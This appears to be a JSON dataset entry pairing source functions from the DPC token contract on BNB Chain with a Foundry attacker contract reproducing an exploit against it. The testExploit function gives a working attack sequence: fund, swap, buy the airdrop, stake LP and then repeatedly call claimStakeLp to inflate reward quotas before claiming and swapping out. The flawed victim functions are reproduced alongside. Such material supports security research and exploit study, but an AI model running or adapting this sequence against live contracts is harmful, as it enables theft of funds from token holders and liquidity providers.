[
  {
    "contract/interface": "IPair",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount)\n        public\n        override\n        returns (bool)\n    {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPair",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        return tokenFromReflection(_rOwned[account]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPCToWBNB",
    "original_code": "    function DPCToWBNB() public {\n        address[] memory path = new address[](3);\n        path[0] = address(DPC);\n        path[1] = address(USDT);\n        path[2] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            DPC.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "USDTToDPC",
    "original_code": "    function USDTToDPC() public {\n        address[] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(DPC);\n        Router.swapExactTokensForTokens(USDT.balanceOf(address(this)) / 2, 0, path, address(this), block.timestamp);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "WBNBToUSDT",
    "original_code": "    function WBNBToUSDT() public {\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokens(WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "addDPCLiquidity",
    "original_code": "    function addDPCLiquidity() public {\n        Router.addLiquidity(\n            address(USDT),\n            address(DPC),\n            USDT.balanceOf(address(this)),\n            DPC.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 21_179_209);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Start] Attacker WBNB balance before exploit\", WBNB.balanceOf(address(this)), 18);\n\n        DPC.approve(address(Router), ~uint256(0));\n        USDT.approve(address(DPC), ~uint256(0));\n        USDT.approve(address(Router), ~uint256(0));\n        Pair.approve(address(DPC), ~uint256(0));\n        WBNB.approve(address(Router), ~uint256(256));\n\n        address(WBNB).call{value: 2 ether}(\"\");\n        WBNBToUSDT();\n        USDTToDPC();\n        DPC.tokenAirdrop(address(this), address(DPC), 100);\n        addDPCLiquidity();\n        DPC.stakeLp(address(this), address(DPC), Pair.balanceOf(address(this)));\n\n        cheats.warp(block.timestamp + 24 * 60 * 60); //spend time\n\n        for (uint256 i = 0; i < 9; i++) {\n            DPC.claimStakeLp(address(this), 1);\n        }\n        DPC.claimDpcAirdrop(address(this));\n        DPCToWBNB();\n\n        emit log_named_decimal_uint(\"[End] Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPC",
    "source_type": "victim_contract",
    "function_name": "claimDpcAirdrop",
    "original_code": "        function claimDpcAirdrop(address addr) public {\n                require(isClaim,\"Collection has not started yet\");\n                require(msg.sender == addr,\"No permission\");\n                time=currTimeStamp();\n                uint256 ClaimQuota = getClaimQuota(addr);\n                require(ClaimQuota > 0,\"erro\");\n                \n                _rOwned[addr] = _rOwned[addr].add(ClaimQuota);\n                _rOwned[address(this)] = _rOwned[address(this)].sub(ClaimQuota);\n                emit Transfer(address(this), addr, ClaimQuota);\n                ClaimQuotaTime[addr] = time; \n                oldClaimQuota[addr] = 0;      \n                dpcAirdrop[addr] = dpcAirdrop[addr].sub(ClaimQuota);        \n                \n        }\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPC",
    "source_type": "victim_contract",
    "function_name": "claimStakeLp",
    "original_code": "        function claimStakeLp(address _from ,uint256 Amountwei) public {\n                require(Amountwei > 0,\"Quantity error\");\n                require(_from==msg.sender,\"error\");\n                require(dpcLp[_from] >= Amountwei ,\"Insufficient authorization limit\");\n                IERC20(LpContract).transfer(_from,Amountwei);\n\n                oldClaimQuota[_from] = oldClaimQuota[_from].add(getClaimQuota(_from));\n\n                dpcLp[_from] = dpcLp[_from].sub(Amountwei);\n\n                time=currTimeStamp();\n                dpcLpTime[_from] = time;\n\n                dpcLpTotal = dpcLpTotal.sub(Amountwei);\n        \n         }\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPC",
    "source_type": "victim_contract",
    "function_name": "stakeLp",
    "original_code": "        function stakeLp(address _from,address _to, uint256 Amountwei) public {\n\n                require(Amountwei > 0,\"Quantity error\");\n                require(_from==msg.sender,\"error\");\n                require(_to==address(this),\"error\");\n                require(IERC20(LpContract).allowance(_from,address(this)) >= Amountwei ,\"Insufficient authorization limit\");\n                IERC20(LpContract).transferFrom(_from,_to,Amountwei);\n\n                oldClaimQuota[_from] = oldClaimQuota[_from].add(getClaimQuota(_from));\n\n                dpcLp[_from] = dpcLp[_from].add(Amountwei);\n\n                time=currTimeStamp();\n               \n\n                dpcLpTime[_from] = time;\n                \n\n                dpcLpTotal = dpcLpTotal.add(Amountwei);\n        \n         }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPC",
    "source_type": "victim_contract",
    "function_name": "tokenAirdrop",
    "original_code": "    function tokenAirdrop(address _from,address _to, uint _amt) public {\n        address cur = _from;\n         \n        uint256 uAmount = _amt * 10 ** 18;\n        uint256 Amount = IdoPrice;\n        uint256 Amountwei = Amount * 10 ** 18;\n        \n        require(_amt == 100,\"Quantity must is 100u\");\n        \n        require(_from==msg.sender,\"error\");\n        require(_to==address(this),\"error\");\n        // require(!isAirdrop[_from],\"Only one airdrop can be obtained for each address\");\n        // require(restAirdrop>=Amountwei,\"Airdrop End\");\n\n        require(IERC20(usdt).allowance(_from,address(this)) >= uAmount ,\"Insufficient authorization limit\");\n        IERC20(usdt).transferFrom(_from,_to,uAmount);//\u8f6cU\n        isAirdrop[_from] = true;\n\n        // dpcIdo[_from] = dpcIdo[_from].add(Amountwei);\n        // dpcIdoTimes[_from] +=1;\n        // idoStartTime[_from] = 0;\n         idoStartTime[_from] = currTimeStamp();\n\n        dpcAirdrop[_from] = dpcAirdrop[_from].add(Amountwei.mul(10));\n        //  restAirdrop = restAirdrop.sub(Amountwei);\n         \n        if(inviter[_from] != address(0)){\n            teamAirdrop[inviter[_from]] += 1;\n            if(teamAirdrop[inviter[_from]] >= 10){\n                isDao[inviter[_from]] = true;\n                daoNum += 1;\n            }\n             dpcAirdrop[inviter[_from] ] = dpcAirdrop[inviter[_from]].add(Amountwei.div(2));\n        //     _rOwned[inviter[_from]] = _rOwned[inviter[_from]].add(uAmount.div(2));\n        //  emit Transfer(address(this), inviter[_from], uAmount.div(2));\n        }\n\n        uint256 ubonus1 = uAmount.mul(70).div(100);\n        IERC20(usdt).transfer(ucur1,ubonus1);\n        // uint256 ubonus2 = uAmount.mul(25).div(100);\n        // IERC20(usdt).transfer(ucur2,ubonus2);\n        // uint256 ubonus3 = uAmount.mul(20).div(100);\n        // IERC20(usdt).transfer(ucur3,ubonus3);\n\n          uint256 ubonus = uAmount.mul(15).div(100);\n          for (uint256 i = 1; i <= 5; i++) {\n             cur = inviter[cur] ;\n             if(cur == address(0)){\n                 break;\n             }\n             if(isAirdrop[cur]){\n                  IERC20(usdt).transfer(cur,ubonus);\n             }\n             ubonus = ubonus.div(2);\n         }\n        \n    }\n\n",
    "description": ""
  }
]